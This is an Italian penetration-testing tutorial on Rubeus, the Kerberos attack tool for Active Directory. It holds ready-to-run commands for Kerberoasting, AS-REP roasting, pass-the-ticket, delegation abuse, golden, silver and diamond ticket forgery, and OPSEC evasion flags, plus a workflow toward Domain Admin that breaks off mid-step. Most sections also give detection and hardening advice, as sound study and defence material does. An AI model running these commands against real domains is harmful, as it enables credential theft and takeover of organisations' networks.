---
title: 'Rubeus: Attacchi Kerberos in Active Directory (2026)'
slug: rubeus
description: 'Rubeus è il tool C# di riferimento per attaccare Kerberos in AD. Scopri Kerberoasting, AS-REP Roasting, Pass-the-Ticket e S4U con detection reale.'
image: /rubeus-kerberos-active-directory.webp
draft: false
date: 2026-02-24T00:00:00.000Z
lastmod: 2026-07-02T00:00:00.000Z
categories:
  - windows
subcategories:
  - active-directory
tags:
  - kerberoasting
  - kerberos
  - red-team
---

# Rubeus: Attacchi Kerberos in Active Directory, Guida Completa per Pentest

Rubeus è il tool C# di GhostPack per interagire a basso livello col protocollo [Kerberos](https://hackita.it/articoli/kerberos/) in Active Directory: richiede TGT/TGS via API di autenticazione senza toccare LSASS, il che lo rende l'alternativa a [Mimikatz](https://hackita.it/articoli/mimikatz/) quando serve credential access senza privilegi amministrativi. Copre Kerberoasting, AS-REP Roasting, Pass-the-Ticket, Overpass-the-Hash, abuse della delegation e forgery di ticket (golden/silver/diamond). Versione corrente: v2.3.3.

In un assessment Active Directory reale è raro trovare decine di account kerberoastable pronti all'uso: più spesso ne trovi 1-3 interessanti, quindi conviene incrociare subito Rubeus con [BloodHound](https://hackita.it/articoli/bloodhound/) per capire quali portano davvero a privilegi utili, invece di crackare hash a caso.

## Cosa imparerai

* Come compilare Rubeus da sorgente (GhostPack non distribuisce binari precompilati)
* Kerberoasting e AS-REP Roasting, incluse le varianti OPSEC-safe
* Richiesta e manipolazione di TGT/TGS: password, hash, certificato (PKINIT)
* Pass-the-Ticket, Overpass-the-Hash, S4U2Self/S4U2Proxy per la delegation
* Forgery di ticket: golden, silver, diamond
* Comandi avanzati: tgtdeleg, monitor/harvest, brute/spray, tgssub, describe
* Come un blue team rileva Rubeus (Event ID, Rubeus.yar, AMSI, ETW, anomalie PAC)

## Prerequisiti

| Requisito       | Dettaglio                                                                                                                                                                                                      |
| --------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Tool            | Rubeus (GhostPack) v2.3.3, compilato da sorgente                                                                                                                                                               |
| Framework       | .NET 3.5/4.0/4.5 (default net35, retargettabile)                                                                                                                                                               |
| Sistema target  | Windows domain-joined, Windows 7+/Server 2008+                                                                                                                                                                 |
| Credenziali     | Utente di dominio valido (per molte azioni), admin locale solo per `dump` da LSASS                                                                                                                             |
| Conoscenze base | [Active Directory](https://hackita.it/articoli/active-directory-pentesting/), [Kerberos](https://hackita.it/articoli/kerberos/), concetti di [lateral movement](https://hackita.it/articoli/lateral-movement/) |
| Autorizzazione  | Contratto di penetration test/red team firmato, scope autorizzato per iscritto                                                                                                                                 |

## 1. Perché Rubeus e non Mimikatz?

Rubeus non tocca mai la memoria di LSASS: usa l'API `LsaCallAuthenticationPackage()` per richiedere ticket via protocollo Kerberos legittimo, quindi non serve essere amministratori locali per la maggior parte delle azioni. Mimikatz invece legge la memoria di LSASS direttamente e richiede privilegi elevati, il che lo rende un bersaglio EDR molto più facile da individuare.

La differenza pratica: con `asktgt`, se applichi il ticket con `/ptt` sovrascrivi il TGT della sessione corrente. Per evitarlo (con privilegi admin) usa `/createnetonly` per creare un processo sacrificale con una sessione di logon dedicata, poi applica il ticket lì con `/luid`.

Il flusso base che ogni comando Rubeus replica o manipola:

```text
Client --AS-REQ (chiave utente)--> KDC
Client <--AS-REP (TGT cifrato)---- KDC
Client --TGS-REQ (TGT + SPN)-----> KDC
Client <--TGS-REP (TGS cifrato)--- KDC
Client --AP-REQ (TGS)------------> Servizio target
```

## 2. Compilazione (nessun binario ufficiale)

GhostPack non pubblica eseguibili precompilati di Rubeus, apposta per non lasciare una signature statica facilmente bloccabile dagli AV — vanno compilati da sorgente.

```bash
git clone https://github.com/GhostPack/Rubeus.git
cd Rubeus
```

Compilazione con Visual Studio 2019+ (apri `Rubeus.sln`, scegli "Release", Build) oppure da riga di comando:

```bash
msbuild Rubeus.sln /p:Configuration=Release
```

Il target framework di default è .NET 3.5 — se manca sul sistema di build, cambialo aprendo il progetto: Project → Rubeus Properties → Target Framework (net40/net45 sono le alternative comuni).

Output in `bin\Release\Rubeus.exe`. Per l'esecuzione in-memory (senza toccare disco), caricalo come assembly da byte array o usa `execute-assembly` di [Cobalt Strike](https://hackita.it/articoli/cobaltstrike/):

```powershell
$bytes = [System.IO.File]::ReadAllBytes("Rubeus.exe")
[System.Reflection.Assembly]::Load($bytes)
[Rubeus.Program]::Main("dump".Split())
```

> Compilare tu stesso il binario, invece di scaricare un `.exe` da internet, evita sia la detection statica sia il rischio concreto di eseguire un Rubeus backdoored da terzi — capita più spesso di quanto si pensi con i tool "precompilati" che girano su forum e repository non ufficiali.

## 3. Kerberoasting

Il Kerberoasting richiede un TGS per ogni account con SPN registrato e ne estrae la porzione cifrata con la chiave dell'account di servizio, crackabile offline: se l'account usa RC4 il crack è rapido, se usa AES256 è molto più lento.

Sintassi completa:

```cmd
Rubeus.exe kerberoast [/user:USER] [/spn:SPN] [/outfile:FILE] [/delay:MS] [/jitter:1-100] [/preauth:USER] [/stats]
```

* `kerberoast` — azione principale
* `/user:USER` — opzionale, limita l'attacco a un solo account invece di tutto il dominio
* `/spn:SPN` — opzionale, mirato a un singolo SPN specifico invece che a tutti gli account
* `/outfile:FILE` — salva gli hash su file invece di stamparli a schermo
* `/delay:MS` / `/jitter:1-100` — OPSEC: millisecondi di pausa tra le richieste + variazione percentuale casuale
* `/preauth:USER` — richiede kerberoast su un account senza Kerberos pre-auth, combinando roasting e AS-REP in un colpo solo
* `/stats` — mostra solo statistiche sugli account roastabili, senza inviare richieste TGS reali

```cmd
Rubeus.exe kerberoast /stats
Rubeus.exe kerberoast /outfile:hashes.txt
```

**Variante OPSEC-safe**, con delay e jitter per non generare un burst di richieste TGS anomalo:

```cmd
Rubeus.exe kerberoast /delay:3000 /jitter:30 /outfile:hashes.txt
```

**Kerberoasting mirato**, solo su un account specifico invece di enumerare tutto il dominio:

```cmd
Rubeus.exe kerberoast /user:svc_sql /outfile:hashes.txt
```

**Kerberoast con pre-auth disabilitato** (`/preauth`), per account che non richiedono Kerberos pre-authentication — combina kerberoasting e AS-REP roasting in un'unica richiesta.

Crack con [Hashcat](https://hackita.it/articoli/hashcat/):

```bash
hashcat -m 13100 hashes.txt rockyou.txt   # RC4
hashcat -m 19700 hashes.txt rockyou.txt   # AES256
```

* `-m 13100` / `-m 19700` — modalità hashcat: dice quale algoritmo usare per decifrare (13100=Kerberoast RC4, 19700=AES256)
* `hashes.txt` — file con gli hash estratti da Rubeus
* `rockyou.txt` — wordlist da provare contro ogni hash

Nella pratica capita spesso che il cracking non recuperi nulla nemmeno dopo ore: quasi sempre non è un problema di Hashcat ma della password policy — se l'azienda applica password complesse su tutti i service account, conviene concentrare il tempo su altri vettori invece di insistere sul crack.

In ambienti enterprise moderni è sempre più comune trovare service account su gMSA (Group Managed Service Account) con password AES256 casuali e ruotate automaticamente: in quel caso il Kerberoasting non porta praticamente a nulla, e conviene spostarsi subito su delegation abuse o [ADCS](https://hackita.it/articoli/esc8-adcs/) invece di insistere.

### Detection e difesa

* **Event ID 4769** (TGS richiesto) con encryption type RC4 (`0x17`) su account con SPN è il segnale classico di kerberoasting — un volume anomalo di 4769 in poco tempo dallo stesso utente è un IOC forte.
* Microsoft Defender for Identity e Microsoft Sentinel hanno regole native per il kerberoasting basate su questo pattern.
* Difesa strutturale: forza AES256 sugli account di servizio (`msDS-SupportedEncryptionTypes`), elimina RC4 dove possibile, usa password lunghe e casuali per i service account (gMSA quando fattibile, ruota automaticamente la password).

## 4. AS-REP Roasting

L'AS-REP Roasting sfrutta account con pre-authentication Kerberos disabilitata (`DONT_REQ_PREAUTH`): l'AS-REP torna cifrato con la chiave derivata dalla password dell'utente e si crack-a offline senza aver mai fornito credenziali valide.

Sintassi completa:

```cmd
Rubeus.exe asreproast [/user:USER] [/format:hashcat|john] [/outfile:FILE]
```

* `asreproast` — azione: cerca account senza pre-auth e richiede il loro AS-REP
* `/user:USER` — opzionale, limita a un account specifico
* `/format:hashcat` — formato di output compatibile con Hashcat (default: John the Ripper)
* `/outfile:FILE` — salva su file invece di stampare a schermo

```cmd
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

Prima identifica gli account vulnerabili senza tentare il roast (utile in fase di enumerazione silenziosa):

```cmd
Rubeus.exe preauthscan /users:C:\temp\users.txt
```

* `preauthscan` — azione: manda AS-REQ di prova per ogni utente nella lista, senza estrarre hash
* `/users:FILE` — file con un nome utente per riga da controllare

Crack:

```bash
hashcat -m 18200 asrep.txt rockyou.txt
```

### Detection e difesa

* **Event ID 4768** (richiesta TGT) senza pre-authentication è il segnale — l'encryption type RC4 lo rende ancora più sospetto.
* Difesa: disabilita `DONT_REQ_PREAUTH` su tutti gli account salvo eccezioni documentate (alcuni sistemi legacy Kerberos-only lo richiedono), audit periodico con PowerView o LDAP query dedicata.

## 5. Richiesta TGT: password, hash, certificato

`asktgt` supporta più metodi di autenticazione, ognuno con un caso d'uso diverso:

| Metodo      | Comando                 | Quando usarlo                                                                               |
| ----------- | ----------------------- | ------------------------------------------------------------------------------------------- |
| Password    | `/password:PASS`        | Credenziali in chiaro disponibili                                                           |
| Hash NTLM   | `/rc4:HASH`             | Overpass-the-Hash da un dump precedente                                                     |
| Chiave AES  | `/aes256:KEY`           | Evita il downgrade a RC4, meno rumoroso                                                     |
| Certificato | `/certificate:file.pfx` | PKINIT con certificato rubato (es. via [ADCS ESC8](https://hackita.it/articoli/esc8-adcs/)) |

Sintassi completa:

```cmd
Rubeus.exe asktgt /user:USER </password:PASS | /rc4:HASH | /aes256:HASH | /certificate:FILE> [/domain:DOMAIN] [/dc:DC] [/ptt] [/opsec] [/nopac] [/proxyurl:URL] [/outfile:FILE]
```

* `asktgt` — azione: richiede un TGT nuovo
* `/user:USER` — account per cui richiedere il ticket
* `/password:PASS` | `/rc4:HASH` | `/aes256:HASH` | `/certificate:FILE` — uno di questi quattro, il metodo di autenticazione (obbligatorio uno solo)
* `/domain:DOMAIN` / `/dc:DC` — opzionali, dominio e domain controller target (auto-rilevati se omessi)
* `/ptt` — applica subito il ticket alla sessione corrente (pass-the-ticket immediato)
* `/opsec` — invia una richiesta AS-REQ più simile al traffico reale di Windows
* `/nopac` — richiede il TGT senza PAC
* `/proxyurl:URL` — instrada la richiesta via KDC proxy invece che diretta al DC
* `/outfile:FILE` — salva il ticket ottenuto su file invece di stamparlo solo a schermo

```cmd
Rubeus.exe asktgt /user:svc_sql /rc4:aad3b435b51404eeaad3b435b51404ee /domain:corp.local /ptt
```

Flag operativi utili: `/opsec` (evita pattern di richiesta anomali), `/nopac` (omette il PAC, utile contro alcune detection legacy ma rilevabile a sua volta come anomalia), `/proxyurl` (instrada la richiesta attraverso un KDC proxy, utile quando non hai linea diretta col DC).

### Detection e difesa

* Richieste TGT (4768) con `/nopac` generano ticket senza PAC standard — pattern non comune nel traffico legittimo, individuabile con regole Sigma dedicate.
* PKINIT con certificato rubato è rilevabile correlando Event ID 4768 con l'uso anomalo di un certificato smart-card su un host che normalmente non lo usa (Certificate Services logging + Defender for Identity).

## 6. Pass-the-Ticket e Overpass-the-Hash

Con un TGT già ottenuto (rubato o richiesto), lo importi nella sessione corrente per autenticarti senza mai conoscere la password in chiaro:

Sintassi completa:

```cmd
Rubeus.exe ptt /ticket:<BASE64 | FILE.KIRBI> [/luid:LOGONID]
```

* `ptt` — azione: importa (pass) un ticket nella sessione di logon
* `/ticket:` — il ticket, come blob base64 o percorso a un file .kirbi
* `/luid:LOGONID` — opzionale (richiede elevazione), applica il ticket a una sessione di logon diversa da quella corrente invece di sovrascrivere la tua

```cmd
Rubeus.exe ptt /ticket:BASE64_TICKET
Rubeus.exe klist
```

L'Overpass-the-Hash converte un hash NTLM in un ticket Kerberos utilizzabile, bypassando l'autenticazione NTLM classica:

```cmd
Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /ptt
dir \\server\share
```

Mappa su **MITRE ATT\&CK T1550.003** (Pass the Ticket) e **T1558** (Steal or Forge Kerberos Tickets).

### Detection e difesa

* Un ticket importato via `ptt` non genera un nuovo Event ID 4768/4769 dal client — l'anomalia da cercare è un Logon Event (4624, tipo 3) con provider Kerberos da un host che non ha mai fatto un AS-REQ visibile per quell'utente.
* Difesa strutturale: Protected Users group per gli account privilegiati (impedisce NTLM fallback e limita la durata dei ticket), Credential Guard per proteggere i ticket in memoria.

## 7. S4U: abuso della delegation

**S4U2Self + S4U2Proxy** (constrained delegation) permette a un account con delegation configurata di impersonare un altro utente verso un servizio specifico:

Sintassi completa:

```cmd
Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> /impersonateuser:TARGET /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/ptt] [/opsec]
```

* `s4u` — azione: esegue S4U2Self + S4U2Proxy
* `/user:USER` — l'account con delegation configurata che stai abusando
* `/rc4:HASH` | `/aes256:HASH` — la chiave dell'account con delegation (in alternativa puoi passare `/ticket:X` se hai già un suo TGT)
* `/impersonateuser:TARGET` — l'utente che vuoi impersonare (tipicamente un amministratore)
* `/msdsspn:SERVICE/SERVER` — lo SPN verso cui l'account ha delegation configurata (valore reale del suo `msDS-AllowedToDelegateTo`)
* `/altservice:SERVICE` — opzionale, sostituisce il nome del servizio nel ticket finale (es. da `ldap` a `cifs`) sfruttando il fatto che l'sname non è protetto dalla firma
* `/ptt` — applica subito il ticket risultante

```cmd
Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/server.corp.local /ptt
```

Con **Resource-Based Constrained Delegation** (RBCD), se controlli un computer account puoi configurare tu stesso la delegation verso il target — vedi la guida dedicata a [RBCD](https://hackita.it/articoli/rbcd/) per il setup completo dell'attributo `msDS-AllowedToActOnBehalfOfOtherIdentity`.

**Unconstrained delegation** è il caso più pericoloso: se un host la ha configurata, ogni utente che vi si autentica lascia un TGT riutilizzabile in memoria. Rubeus può monitorare l'arrivo di nuovi ticket:

```cmd
Rubeus.exe monitor /interval:5 /nowrap
```

Mappa su **MITRE ATT\&CK T1134.001** (Token Impersonation) e **T1558.004** per specifiche varianti.

### Detection e difesa

* Audita periodicamente quali account/computer hanno delegation abilitata (`TrustedForDelegation`, `TrustedToAuthForDelegation`, `msDS-AllowedToDelegateTo`) — dovrebbe essere l'eccezione, non la norma.
* Unconstrained delegation su un host non-DC è quasi sempre un errore di configurazione da correggere, non solo da monitorare.
* Event ID 4769 con flag `FORWARDABLE` verso più servizi diversi nello stesso arco di tempo breve è un indicatore di abuso S4U.

## 8. Ticket forgery: golden, silver, diamond

Oltre a richiedere ticket legittimi, Rubeus può **forgiare** ticket da zero se possiedi la chiave giusta — funzionalità che di solito si associa solo a Mimikatz.

**Golden ticket**: forgia un TGT completo usando l'hash krbtgt. Il flag `/ldap` automatizza il recupero via LDAP di SID, gruppi e policy di dominio invece di doverli passare a mano:

```cmd
Rubeus.exe golden /aes256:KRBTGT_HASH /user:administrator /ldap /ptt
```

**Silver ticket**: forgia un TGS per un servizio specifico usando l'hash dell'account di servizio (non serve krbtgt). Più silenzioso del golden perché non tocca il KDC per l'AS-REQ iniziale — ma è verificabile lato servizio se questo valida il PAC col DC:

```cmd
Rubeus.exe silver /service:cifs/server.corp.local /rc4:SERVICE_HASH /user:administrator /ldap /ptt
```

Il flag `/nofullpacsig` esclude il FullPacChecksum introdotto per mitigare CVE-2022-37967 — utile per compatibilità con ticket verso DC non ancora patchati, ma la sua assenza è di per sé un indicatore.

**Diamond ticket**: la variante più stealth. Invece di forgiare da zero, richiede un TGT reale via AS-REQ/AS-REP (traffico legittimo verso il KDC) e poi modifica il PAC del ticket già ottenuto. Essendo un ticket "vero" all'origine, elude più facilmente la detection basata su anomalie nella richiesta iniziale:

```cmd
Rubeus.exe diamond /krbkey:KRBTGT_KEY /user:svc_backup /password:PASSWORD /ticketuser:administrator /ticketuserid:500 /groups:512
```

### Detection e difesa

* **Golden ticket**: durata del ticket anomala rispetto alla policy di dominio (default 10h), o `PasswordLastSet`/`LogonCount` incoerenti con i dati reali dell'account nel PAC — Defender for Identity li segnala come "ticket anomaly".
* **Silver ticket**: nessun evento 4768 sul DC (il ticket non passa mai dal KDC) — l'anomalia è un accesso al servizio senza una corrispondente richiesta TGT/TGS nei log, visibile solo correlando i log del servizio target con quelli del DC.
* **Diamond ticket**: il più difficile da rilevare perché l'AS-REQ iniziale è reale — la detection si sposta sul PAC stesso (validazione checksum, campi incoerenti con LDAP al momento dell'uso).
* Difesa strutturale comune a tutti e tre: ruota periodicamente la password krbtgt (due volte, a distanza di ore, per invalidare la chain), monitora Defender for Identity/Sentinel per anomalie PAC, limita chi ha accesso in lettura all'hash krbtgt (solo DC, mai cache locali).

## 8.5. Cambio password via Kerberos (changepw)

Se possiedi la password attuale di un utente, puoi cambiarla direttamente via Kerberos (RFC 3244) senza necessità di accesso LSASS:

```cmd
Rubeus.exe changepw /user:username /password:VECCHIA_PASSWORD /new:NUOVA_PASSWORD /domain:corp.local
```

O con hash:

```cmd
Rubeus.exe changepw /user:username /rc4:NTLM_HASH /new:NUOVA_PASSWORD /domain:corp.local
```

Utilizzi pratici: forzare logout dell'utente dalle sessioni precedenti, mantenere persistenza su account compromessi, coprire tracce modificando password e facendola tornare a quella originale.

### Detection

Event ID 4724 (password reset) con provider Kerberos anziché NTLM è sospetto su account non-utente.

## 8.6. Keylist attack (emulazione Read-Only Domain Controller)

Un **keylist attack** finge di essere un Read-Only Domain Controller (RODC) per richiedere il password hash di un utente verso il KDC:

```cmd
Rubeus.exe asktgs /enctype:aes256 /keylist /ticket:TGT_VALIDO.kirbi /service:krbtgt/DOMAIN.LOCAL
```

Richiede un TGT valido di un account con diritti RODC — raro in ambienti moderni, ma possibile se hai già compromesso un account molto privilegiato. Il KDC ritorna l'hash (RC4/AES) dell'utente targetizzato.

### Detection

Event ID 4769 con SPN anomalo (`krbtgt` dal solito client), richiesta da macchina che non è un DC, flag inusuali nel ticket.

## 8.7. asktgs: richiedere un TGS specifico

Mentre `asktgt` richiede un Ticket Granting Ticket dal KDC, **`asktgs`** richiede direttamente un TGS (Ticket Granting Service) per un servizio specifico. Utile quando hai già un TGT e vuoi il ticket per un target preciso senza passare per la richiesta TGS normale.

Sintassi:

```cmd
Rubeus.exe asktgs /ticket:TGT.kirbi /service:cifs/server.corp.local [/u2u] [/enctype:AES256]
```

Parametri:

* `/ticket:FILE` — il TGT da usare (file .kirbi o base64)
* `/service:SPN` — lo SPN target (es. `cifs/server`, `http/web.corp.local`, `ldap/dc`)
* `/u2u` — opzionale, richiesta User-to-User (più rara)
* `/enctype:AES256` — specifica encryption type preferito
* `/ptt` — applica il ticket risultante

Esempio completo:

```cmd
Rubeus.exe asktgs /ticket:admin.kirbi /service:cifs/server.corp.local /ptt
```

Differenza con asktgt:

* `asktgt` → TGT (ticket per chiedere altri ticket)
* `asktgs` → TGS (ticket per accedere al servizio)

Se non hai un TGT ma hai credenziali, usa `asktgt` prima.

## 9. PAC (Privileged Attribute Certificate): deep dive

Il **PAC** è un contenitore binario dentro il TGT che contiene informazioni critiche su utente e privilegi:

| Componente         | Cosa contiene                                          |
| ------------------ | ------------------------------------------------------ |
| LogonInfo          | SID utente, gruppi, timestamp logon                    |
| UpnDnsInfo         | UPN e DNS dell'utente                                  |
| UserAccountControl | UAC flags (disabled, admin, ecc.)                      |
| Signature          | Firma HMAC con chiave krbtgt                           |
| Full PAC Signature | Firma addizionale con chiave servizio (PAC validation) |

**Il problema classico: `/nofullpacsig`**

Se usi `/nofullpacsig` nel `silver` command, escudi la Full PAC Signature — il servizio non può verificare che il PAC non sia stato modificato dal DC. Tolta questa firma, modificare il PAC diventa (teoricamente) possibile, ma richiedi comunque di cifrare il ticket correttamente con l'hash del servizio.

```cmd
Rubeus.exe silver /service:cifs/server /rc4:HASH /user:admin /nofullpacsig
```

**PAC Validation**

Alcuni servizi, se configurati, validano il PAC ricontattando il DC per verificare che il PAC sia legittimo. Se lo fai, il servizio chiede al DC "è vero che questo utente ha questi privilegi?" — se ricontatta e scopre inconsistenze, il ticket viene rifiutato.

**CVE-2022-37967: PAC Signature Forging**

Una vulnerabilità in cui, sotto certe condizioni, il PAC poteva essere firmato con una chiave nota (anziché la chiave krbtgt), permettendo di forgiare PAC arbitrari. Oggi patchato, ma il flag `/nofullpacsig` lo ricorda.

**Ragionamento corretto sul PAC:**

* Il PAC dice al servizio "questo utente ha questi privilegi"
* Se il servizio non valida il PAC col DC, si fida della firma HMAC
* Se la firma è falsa, il ticket è rifiutato — non entra affatto il servizio

## 10. Rilevare Rubeus a runtime

Oltre alla detection per-tecnica già vista, ci sono segnali generici legati al tool stesso:

* **Rubeus.yar**: una regola YARA pubblica (dal red team tool countermeasure repo di FireEye) individua signature statiche del binario compilato di default — motivo in più per compilare con modifiche personalizzate.
* **AMSI**: dal .NET Framework 4.8, l'Antimalware Scan Interface è integrato anche nel CLR .NET, quindi l'esecuzione di Rubeus tramite PowerShell (incluso Empire) passa sotto AMSI e script block logging.
* **execute-assembly** (Cobalt Strike o simili): inietta cross-process e carica il CLR in un processo non-.NET — questo comportamento è un segnale osservabile a prescindere dal payload specifico eseguito.

## 11. Altri comandi utili (estrazione, monitoraggio, utility)

| Comando                        | Cosa fa                                                                                                                                                              |
| ------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `describe`                     | Decodifica un ticket (TGT o TGS) e ne mostra i campi; se il TGS è RC4 estrae automaticamente l'hash kerberoastable, anche da un ticket non ottenuto con `kerberoast` |
| `triage` / `klist` / `dump`    | Scala di dettaglio crescente sui ticket in cache: triage=elenco sintetico, klist=dettaglio, dump=dati completi riusabili                                             |
| `tgtdeleg`                     | Ottiene un TGT riusabile per l'utente corrente **senza elevazione**, abusando il GSS-API con una finta richiesta di delega (trick di Kekeo)                          |
| `monitor`                      | Monitora ogni N secondi l'arrivo di nuovi TGT — indispensabile su host con unconstrained delegation                                                                  |
| `harvest`                      | Come `monitor` ma con auto-renewal dei ticket raccolti, per mantenerli validi nel tempo                                                                              |
| `brute` / `spray`              | Bruteforce o password spraying via richieste Kerberos AS-REQ, path di logging diverso da un brute SMB/LDAP classico                                                  |
| `changepw`                     | Cambia la password di un utente usando il suo TGT (abuso del protocollo kpasswd, "Aorato Kerberos password reset")                                                   |
| `hash`                         | Calcola rc4\_hmac/aes128/aes256/des da una password in chiaro nota — utile per verificare offline un hash trovato                                                    |
| `tgssub`                       | Sostituisce il service name in un TGS esistente — primitiva chiave per abusare RBCD senza rifare tutto il flusso S4U                                                 |
| `currentluid` / `logonsession` | Recon sulla sessione di logon corrente (o su tutte, se elevato)                                                                                                      |

### Esempi pratici comandi utili

**dump — Estrai TGT di admin che si è appena loggato**

```cmd
Rubeus.exe dump
```

Cerchi negli output un account interessante (es. `CORP\Administrator`). Se vedi un TGT lì, copialo:

```cmd
Rubeus.exe ptt /ticket:BASE64_TGT_ADMIN
```

Ora sei admin in quella sessione.

**monitor — Aspetta che un admin si connetta a un server con unconstrained delegation**

Su un server vulnerabile a unconstrained delegation (raro, ma accade):

```cmd
Rubeus.exe monitor /interval:5 /nowrap
```

Rubeus controlla ogni 5 secondi. Se un Domain Admin si connette al server per accedere una risorsa (SMB, RDP, ecc.), il suo TGT arriva nella cache. Lo catturi qui.

**renew — Rinova un TGT che sta per scadere**

```cmd
Rubeus.exe renew /ticket:VECCHIO_TGT.kirbi /ptt
```

Funziona solo se il TGT ha il flag `RENEWABLE` nel campo RenewTill. Se scade completamente, non puoi rinnovare — serve una nuova autenticazione.

**describe — Analizza cosa c'è dentro a un ticket**

```cmd
Rubeus.exe describe /ticket:BASE64_QUALSIASI
```

Utile per capire:

* Encryption type (RC4 vs AES)
* SID e gruppi dell'utente
* Quando scade il ticket
* PAC contents (se readable)

**tgtdeleg in dettaglio** — se sei già autenticato come un utente sul sistema, la sessione Kerberos esistente basta per ottenere un TGT riutilizzabile altrove, senza bisogno di password né hash: sfrutta il GSS-API con una finta richiesta di delega (trick preso da Kekeo).

Sintassi completa:

```cmd
Rubeus.exe tgtdeleg [/target:SPN] [/nowrap]
```

Parametri dettagliati:

* `tgtdeleg` — azione: richiede un TGT per l'utente corrente senza elevazione
* `/target:SPN` — opzionale, specifica lo SPN target manualmente (es. `HOST/dc.dominio.local`) se Rubeus non riesce a determinare da solo dominio/DC
* `/nowrap` — opzionale, non spezza il base64 su più righe (comodo per copiare il ticket direttamente)

**Esempio minimo** (auto-detect dominio e DC):

```cmd
Rubeus.exe tgtdeleg
```

**Esempio con target esplicito e output a una riga**:

```cmd
Rubeus.exe tgtdeleg /target:HOST/dc.corp.local /nowrap
```

Output: TGT in base64. Copia il base64 e importalo direttamente:

```cmd
Rubeus.exe ptt /ticket:BASE64_QUI
```

> Il TGT senza sessione key restituito da `tgtdeleg` è comunque usabile per richieste TGS successive, anche se non permette tutte le operazioni di un TGT ottenuto con `asktgt` da hash/password.

### Da .kirbi a .ccache (uso con Impacket)

Rubeus e Mimikatz lavorano in formato `.kirbi`, ma gli strumenti Linux basati su [Impacket](https://hackita.it/articoli/impacket/) (wmiexec.py, secretsdump.py, ecc.) leggono solo `.ccache`. È lo stesso ticket, cambia solo il contenitore binario — serve convertire per portare un ticket ottenuto su Windows dentro un tool Python su Linux.

**Step 1: Decodificare base64 → .kirbi**

Rubeus restituisce il ticket in base64. Decodi su Windows (PowerShell):

Se il base64 è salvato direttamente in una variabile:

```powershell
$base64 = "BASE64_RUBEUS_OUTPUT_QUI"
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String($base64))
```

Se il base64 è in un file di testo `ticket.b64`:

```powershell
$base64 = Get-Content ticket.b64
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String($base64))
```

Su Linux (bash), se hai il base64 direttamente:

```bash
echo "BASE64_RUBEUS_OUTPUT_QUI" | base64 -d > ticket.kirbi
```

O da file:

```bash
cat ticket.b64 | base64 -d > ticket.kirbi
```

**Step 2: Convertire .kirbi → .ccache**

Usa `ticketConverter.py` (incluso in Impacket):

```bash
python3 ticketConverter.py ticket.kirbi ticket.ccache
```

Output: `ticket.ccache` pronto per Impacket.

**Step 3: Esportare la variabile d'ambiente e usare il ticket**

```bash
export KRB5CCNAME=$(pwd)/ticket.ccache
```

Ora puoi usare qualsiasi tool Impacket con `-k -no-pass`:

```bash
wmiexec.py dominio/utente@target -k -no-pass
```

Oppure:

```bash
secretsdump.py dominio/utente@target -k -no-pass
```

Oppure:

```bash
psexec.py dominio/utente@target -k -no-pass
```

`-k` dice "autentica con Kerberos", `-no-pass` dice "non chiedere password, usa il ticket in `KRB5CCNAME`".

**Conversione inversa: .ccache → .kirbi**

Se hai un ticket `.ccache` da Linux e lo vuoi usare in Rubeus/Mimikatz su Windows:

```bash
python3 ticketConverter.py ticket.ccache ticket.kirbi
```

Copia `ticket.kirbi` su Windows, poi:

```cmd
Rubeus.exe ptt /ticket:C:\path\to\ticket.kirbi
```

Oppure converti direttamente a base64 per il copincolla:

```powershell
$bytes = [System.IO.File]::ReadAllBytes("ticket.kirbi")
$base64 = [Convert]::ToBase64String($bytes)
$base64 | Set-Clipboard
```

Poi importa in Rubeus:

```cmd
Rubeus.exe ptt /ticket:BASE64_QUI
```

> Il **Bronze Bit exploit** (CVE-2020-17049) è implementato col flag `/bronzebit` sul comando `s4u`: forza il flag forwardable durante S4U2Self anche quando l'account non dovrebbe poterlo ottenere, ma richiede la chiave a lungo termine dell'account di servizio per ri-cifrare il ticket.

## Flag OPSEC: stealth durante le operazioni

Rubeus supporta diversi flag per ridurre la detection:

**`/opsec`** — modifica le richieste Kerberos per assomigliare più al traffico legittimo (toglie alcuni flag anomali, aggiunge supporto PA-PAC-OPTIONS):

```cmd
Rubeus.exe asktgt /user:admin /password:pass /opsec /ptt
```

**`/rc4opsec`** — nel kerberoasting, targetizza solo account che **non** supportano AES, in modo da non forzare downgrade di RC4 che sarebbe rilevabile:

```cmd
Rubeus.exe kerberoast /rc4opsec /delay:3000 /jitter:30
```

**`/delay` e `/jitter`** — aggiungi delay e variabilità fra le richieste per evitare burst anomali di TGS:

```cmd
Rubeus.exe kerberoast /delay:5000 /jitter:30 /outfile:hashes.txt
```

**`/createnetonly`** — crea un processo sacrificale con una logon session dedicata anziché sovrascrivere il TGT della sessione corrente:

```cmd
Rubeus.exe asktgt /user:admin /rc4:HASH /createnetonly:C:\Windows\System32\cmd.exe /ptt /show
```

Con `/show` vedi l'output della nuova sessione.

Ragionamento corretto: OPSEC non è un flag magico — riduce il rumore, ma un SOC esperto riconosce comunque i pattern di Rubeus. Usalo per ridurre la detection passiva, non per "diventare invisibile".

## Workflow operativo completo: da enumerazione a DA

Questo è il flusso reale di un assessment AD da zero a Domain Admin. Ogni step ha un perché.

**Step 1: Enumerazione iniziale (BloodHound)**

```
bloodhound-python -d domain.local -u user -p pass -c All -ns DC_IP
```

Obiettivo: mappare quali account hanno SPN registrati, quali hanno delegation, quali appartengono a gruppi critici. BloodHound crea il grafo: non lanci Rubeus a caso su 5000 account.

**Step 2: Kerberoasting mirato**

Una volta che BloodHound ha identificato gli SPN, lancia Rubeus SOLO su quelli interessanti:

```cmd
Rubeus.exe kerberoast /user:svc_sql /user:svc_web /delay:3000 /jitter:30 /outfile:hashes.txt
```

Perché non tutto il dominio? Generi un burst di TGS-REQ rilevabile, e molti account potrebbero avere password casuali (gMSA).

**Step 3: Crack offline (Hashcat)**

```bash
hashcat -m 13100 hashes.txt rockyou.txt -r rules.txt
```

Se dopo 2-3 ore niente esce, probabilmente la password non è in dizionario. Passa al step 4.

**Step 4a: Password trovata → Accesso diretto**

Se il crack ha funzionato:

```cmd
